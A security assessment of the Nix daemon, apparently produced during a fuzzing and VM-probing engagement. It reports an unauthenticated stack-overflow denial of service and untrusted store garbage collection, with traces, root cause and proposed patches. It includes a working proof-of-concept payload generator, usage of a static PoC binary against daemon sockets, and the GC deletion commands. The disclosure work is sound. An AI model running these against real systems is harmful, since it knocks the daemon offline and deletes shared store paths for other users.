# Security assessment: Nix daemon fuzzing + live VM probes

## Executive summary

Two distinct findings:

1. **HIGH — untrusted (allowed) local users can delete store paths via GC.**
   The daemon's `CollectGarbage` operation has **no trusted-user gate** on the
   destructive `gcDeleteDead` / `gcDeleteSpecific` actions; only
   `ignoreLiveness` is checked. With the common `allowed-users = *` plus the
   default `0666` socket, *any* local user can make the root daemon garbage-collect
   the shared store, deleting valid-but-unrooted paths of all users. Confirmed on
   all five probed VMs (Nix 2.35.6, `trusted-users = root`, `sandbox = true`):
   `nix store gc` issued as the untrusted `nixos` user deleted real store paths
   (17 paths / 127 MiB on one VM; **160 paths including `stdenv-linux`** on
   another). This is a store integrity/availability compromise, not just a DoS.

2. **HIGH — unauthenticated worker-protocol stack-overflow DoS.** The three AFL
   crash artifacts are **the same bug**: unbounded recursion in the daemon-side
   `DerivedPath` legacy parser, reachable from `BuildPaths` *before* any trust
   check. Any local user can crash the per-connection worker (~14k–17k `!`
   separators, stack-size dependent); ~64 such connections trip the acceptor's
   crash limit and stop the socket service for everyone. Not memory corruption,
   not code execution — pure stack exhaustion.

A smaller **Medium** finding: `OptimiseStore` and `AddSignatures` are also not
trusted-gated (unauthenticated store mutation / signature-append; both
integrity-bounded by the content-addressing and `require-sigs` mechanisms).

The **build sandbox itself is sound**: `__noChroot` is correctly refused for
untrusted users under `sandbox = true`, and no chroot escape, network egress,
sensitive-file access, or store-write from a build was demonstrated. No
privilege escalation was found.

---

## Live VM probe program (findings 1, 2, and the Medium items)

Five NixOS VMs (Nix 2.35.6, kernel 6.18.63) were probed end-to-end:

| VM | IP | Store | Notable live evidence |
| --- | --- | --- | --- |
| vm-1 | 192.168.1.228 | RO ext4 mount | `nix store gc` (untrusted) deleted 65 + 21 paths (~255 MiB); `addtostorenar`/`optimizestore` accepted untrusted |
| vm-2 | 192.168.1.204 | RO ext4 mount | `nix store gc` (untrusted) deleted 17 paths / 127.4 MiB; crash threshold 13,767 |
| vm-3 | 192.168.1.214 | RO ext4 mount | `nix store gc` (untrusted) deleted 161 paths incl. `stdenv-linux`/`bash`/`coreutils`; crash threshold 13,763 |
| vm-4 | 192.168.1.218 | RO ext4 mount | `nix store gc` (untrusted) deleted **160 paths** incl. `stdenv-linux`, `gcc-wrapper`, `patchelf`; crash threshold 13,761 |
| vm-5 | 192.168.1.242 | RO ext4 mount | `nix store gc` (untrusted) deleted **339 paths** incl. `stdenv-linux`, `bash`, `coreutils`; crash threshold 13,763 |

Common configuration: `allowed-users = *`, `trusted-users = root`,
`sandbox = true`, `sandbox-fallback = false`, `require-sigs = true`,
socket-activated daemon, socket mode `0666`, 32 locked `nixbld*` users.
Probes ran as the untrusted `nixos` user (uid 1000; `Trusted: 0` per
`nix store info`), over the daemon socket with a static worker-protocol client
and with the stock `nix` CLI.

Per-VM detail: `src/libstore-tests/fuzz/vm-probe-results/vmN-<ip>.md`.

### F1 — `CollectGarbage` is not trusted-gated (HIGH)

`src/libstore/daemon.cc`, `case WorkerProto::Op::CollectGarbage` (lines 794–834)
contains exactly **one** authorization check:

```cpp
if (options.ignoreLiveness)
    throw Error("you are not allowed to ignore liveness");
```

There is no check that the client is *trusted* (or even the store owner) for
`GCAction::gcDeleteDead` or `gcDeleteSpecific`. The client-side
`nix store gc` (`src/nix/store-gc.cc:44`) sends `gcDeleteDead` (or
`gcDeleteSpecific` for `nix store delete`), and `authPeer()`
(`src/nix/unix/daemon.cc:239`) accepts any *allowed* user as
`TrustedFlag::NotTrusted` — which `allowed-users = *` makes everyone. The root
daemon then performs the deletions.

Live evidence (untrusted `nixos`):

```text
# vm-4
$ nix store info | grep Trusted
Trusted: 0
$ nix store gc
deleting '/nix/store/...-stdenv-linux'
deleting '/nix/store/...-gcc-wrapper-15.3.0.drv'
...
160 store paths deleted          # store count 11769 -> 11609

# vm-2
$ nix store gc
deleting '/nix/store/...-gnutar-1.35'
...
17 store paths deleted, 127.4 MiB freed
```

Impact: any unprivileged local user can purge the shared store, breaking builds
and installations for all users and forcing re-fetches; with `--max` it is a
metered deletion, and repeated runs are a persistent local availability attack.
`gcDeleteSpecific` (`nix store delete <paths>`) extends this to *targeted*
deletion of specific paths (those not reachable from roots).

Note the asymmetry with the rest of the daemon, which *does* gate its
destructive operations on `trusted`: `VerifyStore` repair, `AddToStore`/
`AddToStoreNar` repair, `BuildPaths`/`BuildPathsWithResults` repair mode,
`BuildDerivation` input-addressed builds, `AddPermRoot`, `AddBuildLog`. GC is
the outlier.

**Proposed fix:** in `performOp`, reject destructive GC actions for untrusted
clients, e.g.

```cpp
if ((options.action == GCAction::gcDeleteDead ||
     options.action == GCAction::gcDeleteSpecific) && !trusted)
    throw Error("you are not privileged to garbage collect the store");
```

(Read-only GC actions `gcReturnLive`/`gcReturnDead` may remain open;
`ignoreLiveness` stays gated as today. An alternative is a dedicated
`gc-users` setting, but the minimal correct change is the trusted gate.)

### F2 — untrusted `OptimiseStore` / `AddSignatures` (Medium)

* `case WorkerProto::Op::OptimiseStore` (lines 937–942) has no `trusted` check:
  any allowed user can trigger store-wide hardlink dedup. Integrity-preserving
  (hash-identical files only) but an unauthorized store mutation; observed
  running to completion for untrusted `nixos` on vm-1 and vm-4.
* `case WorkerProto::Op::AddSignatures` (lines 956–964) has no `trusted` check:
  an untrusted client can append signature entries to a store path's
  `ValidPathInfo`. Impact is bounded — `checkSignatures()`
  (`src/libstore/path-info.cc:126`) only accepts signatures that verify against
  `trusted-public-keys`, so a forged entry cannot make a path trusted or
  `ultimate`; but it is an authorization gap and a vector for polluting
  path-info state.

**Proposed fix:** add `if (!trusted) throw Error(...)` to both cases.

### F3 — `nix store add` by untrusted users (Info / by design)

`nix store add` works for untrusted users on every VM (paths land as
`root:nixbld`, mode `0444`). This is **intentional**: the path is a
content-addressed hash of the exact content, `info.ultimate` is forced false
for untrusted clients (`daemon.cc:992`), and with `require-sigs = true` such
paths cannot be *substituted into builds* by other users
(`pathInfoIsUntrusted`, `src/libstore/local-store.cc:1073`). It does not break
store integrity (no overwrite of a different path is possible) and is reported
here only to contrast with F1: the daemon *does* model store *additions* by
untrusted users as an expected, integrity-preserving capability — while
store *deletion* (GC) is mistakenly treated as equally open.

### Sandbox and privilege-escalation results: SAFE

Probed and **blocked** on every VM (details in the per-VM files):

* `__noChroot = true` / `__noSandbox = true` — refused for untrusted users
  when `sandbox = true` (the existing trusted-gate holds).
* Build chroot: writes outside the chroot, reads of `/etc/shadow`, direct
  `/nix/store` writes from a build, symlink/hardlink escapes, and network
  egress (curl to the cloud metadata endpoint, `/proc/net/tcp` empty) all
  failed. Network namespace isolation verified.
* `setoptions` accepted for untrusted users but is **per-connection only**:
  restricted settings are dropped for untrusted clients
  (`ClientSettings::apply`, `daemon.cc:297-309`), and a subsequent fresh build
  was still chrooted. No global config change, no sandbox disable.
* Direct `/nix/store` write as `nixos` — `Read-only file system` (the store is
  a read-only ext4 mount; note this mount property is *defense in depth*, not
  the authorization mechanism — the daemon would delete from it anyway, see
  F1).
* `AddPermRoot`, input-addressed `BuildDerivation`, `VerifyStore --repair`,
  `AddToStore`/`AddToStoreNar` with `repair=1` — all correctly refused.
* `nixbld*` accounts locked; SUID/SGID surface is the standard NixOS set;
  unprivileged user namespaces are available (`user.max_user_namespaces =
  7719`, stock NixOS baseline) with no demonstrated escalation path.
* `require-sigs` holds: `nix store verify` reports untrusted paths as such;
  unsigned realisations are rejected.

**Caveat:** the probe VMs give `nixos` passwordless `sudo` (cloud-init test
provisioning). All protocol-level findings were still issued as the *untrusted*
`nixos` principal over the daemon socket (daemon logs `user nixos`), so the
findings are independent of the sudo access; on a stock NixOS host without
NOPASSWD sudo the same operations are available to any regular local user.

---

## Finding 2 detail: AFL crashes in `fuzz-daemon-message` (worker DoS)

The three crash artifacts in
`/tmp/opencode/nix-fuzz-parent/afl-out/default/crashes` are **the same bug**.
All are stack exhaustion caused by unbounded recursion in Nix's daemon-side
`DerivedPath` parser. The recursion is reachable from the `BuildPaths` worker
protocol operation, before any trust or repair-mode check is performed.
The third artifact was found later by continued fuzzing and was re-checked in
detail; it does not add a new vulnerability class (see "Crash 3" below).

**Verdict:** this is **not a memory-corruption or code-execution vulnerability**.
It is a **local denial-of-service** issue (CWE-674, uncontrolled recursion). A
user who is allowed to connect to the Nix daemon can send a crafted
`BuildPaths` request containing a derived-path string with enough `!` separators
to crash the per-connection daemon worker. Roughly 16,500–17,000 separator
bytes are sufficient with the default 8 MiB stack in the reference build; on
the live 2.35.6 VMs the threshold was lower and build-specific (13,761–13,767
separators), confirming it depends on per-frame stack usage and worker stack
size rather than being a fixed wire-format property.

The normal nix-daemon accepts a Unix-domain socket (default mode `0666`) and
defaults to `allowed-users = *`, so an unprivileged local user can reach this
path. The acceptor re-execs a fresh worker for every connection, so one crash
only kills that user's own worker. However, the acceptor aborts after 64 worker
crashes (`crashLimit = 64` in `src/nix/unix/daemon.cc`), so repeated malformed
connections can terminate the daemon acceptor for all users until it is
restarted (normally automatically by socket activation). There is no
confidentiality or integrity impact from this crash itself (see F1 for the
integrity findings).

Typical severity: **Low–Medium** for the crash alone (local, availability-only,
worker-isolated), rising on hosts that depend continuously on the Nix daemon.

---

## Artifacts examined

| File | Size | AFL metadata |
| --- | ---: | --- |
| `id:000000,sig:11,src:000537,time:1844122,execs:3356703,op:havoc,rep:16` | 67,457 B | SIGSEGV, havoc mutation |
| `id:000001,sig:11,src:000352,time:2624085,execs:4712895,op:havoc,rep:7` | 29,948 B | SIGSEGV, havoc mutation |
| `id:000002,sig:11,src:000485,time:6751891,execs:13122095,op:havoc,rep:49` | 29,304 B | SIGSEGV, havoc mutation (found 2026-11-18 22:51) |

Verbatim copies of all three artifacts are saved in this repository under
`src/libstore-tests/fuzz/regression/` as `afl-id-000000.bin`,
`afl-id-000001.bin` and `afl-id-000002.bin` (sha256 respectively
`c8dee7139cf661961b68b34ca47887532267622ad208eddad7a7abd37a7bb8cb`,
`56247fa6c2502e7f590045c9b75e6ccb53590c9175dd6125a304d6c897292423`,
`efeaa17013299cc11411edf1b7dc1aeeeedf96df2d7570a94e8c27c8cea56981`).

All were found with:

```text
afl-fuzz -i src/libstore-tests/fuzz/data/daemon-messages \
         -o /tmp/opencode/nix-fuzz-parent/afl-out \
         -x src/libstore-tests/fuzz/daemon-messages.dict \
         -- /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

The harness (`src/libstore-tests/fuzz/daemon-message.cc`) feeds the bytes to the
real daemon request parser, `nix::daemon::processConnection`, using a
`DummyStore`, `Trusted`, and `RecursiveFlag::Recursive`. No real store path or
build is touched.

---

## Reproduction

### No-ASAN AFL build (used for gdb)

```text
/tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

Meson options: `b_sanitize=none`, AFL libFuzzer-compatible driver.

### ASAN/libFuzzer build

```text
LD_LIBRARY_PATH=/usr/lib/llvm-22/lib/clang/22/lib/linux \
ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-22/bin/llvm-symbolizer \
/tmp/opencode/nix-fuzz-parent/build-libfuzzer/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message <input>
```

ASAN reports:

```text
ERROR: AddressSanitizer: stack-overflow
  #0 ...
  #1 __asan_memcpy
  #2 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
  #3 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
  #4+ repeated frames at derived-path.cc:132
```

The classification is **stack-overflow**, not heap-buffer-overflow,
use-after-free, or invalid free.

---

## GDB backtraces

Command used for both inputs:

```sh
gdb -nx -q -batch \
  -ex 'set pagination off' \
  -ex 'set print frame-arguments none' \
  -ex 'set print repeats 0' \
  -ex 'handle SIGPIPE nostop noprint pass' \
  -ex 'run "<crash-file>"' \
  -ex 'bt -30' \
  /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

### Crash 1 — `id:000000`

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (
    this=..., __str=..., __pos=..., __n=...) at .../bits/string_view.tcc:100

#0  0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  0x00007ffff75b01cd in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  0x00007ffff75a6762 in nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127

#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
                 (~16,335 recursive frames)

#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<nix::WorkerProto, std::vector<nix::DerivedPath>>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

### Crash 2 — `id:000001`

The second input produces the identical stack:

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (...)

#0  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<...>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

The only differences between the two runs were the writer-thread LWP ID and one
register value; the crash path and depth were the same.

### Crash 3 — `id:000002` (newer artifact)

Replayed under both harnesses. gdb shows the same signature: SIGSEGV in
`std::string_view::rfind`, then ~16,300 frames at `derived-path.cc:132`, followed
by `parseWith` → `parseLegacy` → `worker-protocol.cc:212` → `daemon.cc:593` →
`processConnection`. ASAN again reports:

```text
ERROR: AddressSanitizer: stack-overflow
  #1 __asan_memcpy
  #2 nix::parseWithSingle(...) at derived-path.cc:127
  #3+ repeated frames at derived-path.cc:132
```

The payload is 29,304 bytes of which 25,409 are `!` bytes (plus unrelated havoc
garbage) — the same recursive separator trigger, just a larger mutation. There
is no new bug class and no change to the risk assessment.

`afl-tmin` was attempted but timed out during its final character-minimization
stage. A structurally minimized reproducer was produced instead (see "Minimal
proof of concept" below).

---

## Root cause

`src/libstore/derived-path.cc`:

```cpp
static SingleDerivedPath parseWithSingle(
    const StoreDirConfig & store,
    std::string_view s,
    std::string_view separator,
    const ExperimentalFeatureSettings & xpSettings)
{
    size_t n = s.rfind(separator);                                  // line 127
    return n == s.npos
               ? (SingleDerivedPath) SingleDerivedPath::Opaque::parse(store, s)
               : (SingleDerivedPath) SingleDerivedPath::Built::parse(
                     store,
                     make_ref<const SingleDerivedPath>(
                         parseWithSingle(store, s.substr(0, n), separator, xpSettings)), // line 132
                     s.substr(n + 1),
                     xpSettings);
}
```

`parseWith()` at line 160 calls `parseWithSingle()` with separator `"!"`, and
`DerivedPath::parseLegacy()` at line 174 calls `parseWith()`.

For a wire string consisting of many `!` characters, `rfind("!")` always finds a
separator, so the function recurses on successively shorter prefixes. There is
no recursion-depth limit. Each frame is large enough that roughly 16.5k nested
calls exhaust the default 8 MiB stack.

The call from the daemon is:

```text
daemon.cc:593  auto drvs = WorkerProto::Serialise<DerivedPaths>::read(*store, rconn);
worker-protocol.cc:212  return DerivedPath::parseLegacy(store, s);
```

The `dynamic-derivations` experimental-feature check inside
`SingleDerivedPath::Built::parse()` (via `drvRequireExperiment`, line 101) is
evaluated only while unwinding, after the recursive descent has already
consumed the stack. It therefore does not prevent the crash.

---

## Minimal proof of concept

The harness input can be generated from the first 32 bytes of a valid seed
(magic, version 1.37, obsolete affinity and reserve fields), followed by the
`BuildPaths` opcode, a one-element vector, and a length-prefixed string of `!`
characters:

```python
import struct, pathlib

seed = pathlib.Path(
    'src/libstore-tests/fuzz/data/daemon-messages/is-valid-path.bin'
).read_bytes()[:32]

n = 17000
poc = bytearray(seed)
poc += struct.pack('<QQQ', 9, 1, n)      # op=BuildPaths, vector size=1, string length=n
poc += b'!' * n
poc += b'\0' * ((-n) % 8)                # wire padding to 8 bytes

pathlib.Path('/tmp/poc-buildpaths-stackoverflow.bin').write_bytes(poc)
```

Observed with the no-ASAN build under the default 8 MiB stack:

```text
n = 16000  -> exit 0
n = 16500  -> exit 139 (SIGSEGV)
n = 17000  -> exit 139 (SIGSEGV)
n = 20000  -> exit 139 (SIGSEGV)
```

A binary search over `n` with that build found the exact threshold at
**`n = 16319`** (16,376 bytes total); `n = 16318` exits normally. The ASAN build
crashes as well with `AddressSanitizer: stack-overflow`. The threshold depends on
stack rlimit and compiler instrumentation — on the live Nix 2.35.6 VMs it was
**13,761–13,767** separators (vm-4: 13,760 clean / 13,761 crash; vm-2: 13,766
clean / 13,767 crash), i.e. the reference figure is build-specific, and the
17 KB regression reproducer crashes both builds with margin.

A margin-keeping reproducer at `n = 17000` (17,056 bytes) is stored as a
regression input at:

```text
src/libstore-tests/fuzz/regression/daemon-message-buildpaths-stackoverflow.bin
sha256 16b7c8d9d38bb9617d20559e3635da7c37fd7f63cdbf3ac13e5531c03e6099e1
```

It crashes both harnesses with the same stack as the original artifacts. It is
deliberately **not** placed in `data/daemon-messages/`, because that directory is
the seed corpus used by `packaging/fuzz-seed-check.nix`, which replays every seed
and expects no crash. See `src/libstore-tests/fuzz/README.md`.

For testing against a real nix-daemon, the repository root also contains a
single-file, statically linked PoC: `poc-static` (source `poc_embedded.c`). It
embeds those same 17,056 wire bytes and sends them to the daemon socket, so only
that one file needs to be copied to the target host:

```sh
./poc-static                        # /nix/var/nix/daemon-socket/socket
NIX_DAEMON_SOCKET_PATH=/run/nix/daemon-socket ./poc-static
./poc-static /path/to/daemon-socket
```

It prints whether the daemon worker closed the connection without a protocol
error (expected stack overflow) or replied with an error (bug fixed / request
rejected).

---

## Reachability in a real Nix install

* The daemon listens on a Unix-domain socket, by default
  `/nix/var/nix/daemon-socket/socket`, created with mode `0666`
  (`src/libcmd/include/nix/cmd/unix-socket-server.hh:53`).
* `allowed-users` defaults to `*` (`src/nix/unix/daemon.cc:85-100`), so any local
  user can connect. Such users are normally `NotTrusted`, but that does not
  matter here: the `BuildPaths` drv vector is parsed at `daemon.cc:593` before
  the `bmRepair && !trusted` check at `daemon.cc:606`.
* For protocol version >= 1.30, `WorkerProto::Serialise<DerivedPath>::read`
  uses `DerivedPath::parseLegacy`, i.e. the `!` separator path.
* The acceptor spawns a fresh re-exec'd worker per connection
  (`src/nix/unix/daemon.cc:410-471`). A single malicious request therefore
  crashes only that connection's worker.
* The acceptor tracks signal crashes and throws `AbortServeSocket` after
  `crashLimit = 64` crashes (`src/nix/unix/daemon.cc:333,397-406`). Repeated
  connections from one user can therefore terminate the daemon acceptor for all
  users until it is restarted.

The daemon is not network-facing by default. Remote exploitation requires an
explicit TCP-to-Unix-socket forward or an authenticated stdio/ssh transport;
ordinary remote attackers cannot reach this code.

---

## Exploitability assessment

### Code execution / memory corruption: **No**

* ASAN classifies the fault as `stack-overflow`, not an out-of-bounds write or
  use-after-free.
* The stack grows one ordinary frame at a time into its guard page; the kernel
  delivers SIGSEGV before any adjacent mapping or return address is overwritten
  by attacker-controlled data.
* The payload only controls the *number* of recursion steps and the string
  contents, not a pointer or a write destination.
* Workers are re-exec'd per connection, giving fresh ASLR and limiting the blast
  radius of a crashed worker.

### Denial of service: **Yes, local and limited**

* Any local user permitted to connect to the daemon can crash their own worker
  with a ~17 KB request.
* With ~64 such connections, the acceptor exits, denying service to other users
  until systemd/socket activation or manual intervention restarts it.
* No store corruption, privilege escalation, or data disclosure was observed.

---

## Recommendations

1. **Gate destructive GC on `trusted`** (finding F1, HIGH): reject
   `gcDeleteDead` / `gcDeleteSpecific` for untrusted clients in
   `case WorkerProto::Op::CollectGarbage`, mirroring the existing
   `repair`/`AddPermRoot`/input-addressed-build checks. See F1 for the
   proposed code.
2. **Gate `OptimiseStore` and `AddSignatures` on `trusted`** (finding F2,
   Medium): add `if (!trusted) throw Error(...)` to both cases.
3. Add an explicit recursion-depth limit to `parseWithSingle()` and `parseWith()`
   (the draft patch below uses 1000 levels; a smaller value such as 64 or 128 is
   also defensible for legitimate derived paths) and throw a normal `Error` when
   exceeded.
4. Prefer rewriting the parser as an iterative loop that repeatedly splits on
   the last separator and builds the nested representation on the way back.
5. Optionally cap the accepted length of a worker-protocol `DerivedPath` string
   in `WorkerProto::Serialise<DerivedPath>::read`.
6. A regression reproducer has been added at
   `src/libstore-tests/fuzz/regression/daemon-message-buildpaths-stackoverflow.bin`.
   Once the depth cap lands, wire it into a negative test that expects a normal
   `Error` (not a signal). Do **not** add it to `data/daemon-messages/`: that is
   the seed corpus replayed by `packaging/fuzz-seed-check.nix`, which expects
   every seed to succeed.
7. Consider per-client crash accounting, or resetting the global crash counter,
   so a single abusive user cannot terminate the acceptor for everyone.
8. If reporting upstream, attach all three AFL artifacts and the minimal PoC
   generator above; all three reduce cleanly to the same recursion bug. The GC
   trusted-gate gap (F1) is a separate upstream issue.
9. A draft, **unapplied** patch for recommendation 3 is at
   `/tmp/opencode/nix-fuzz-parent/fix-derived-path-recursion.patch`. It adds a
   depth cap (`maxDerivedPathDepth = 1000`) to `parseWithSingle()` and
   `parseWith()` and throws a normal `Error` when exceeded. It passes
   `git apply --check` but has not been committed to the source tree.
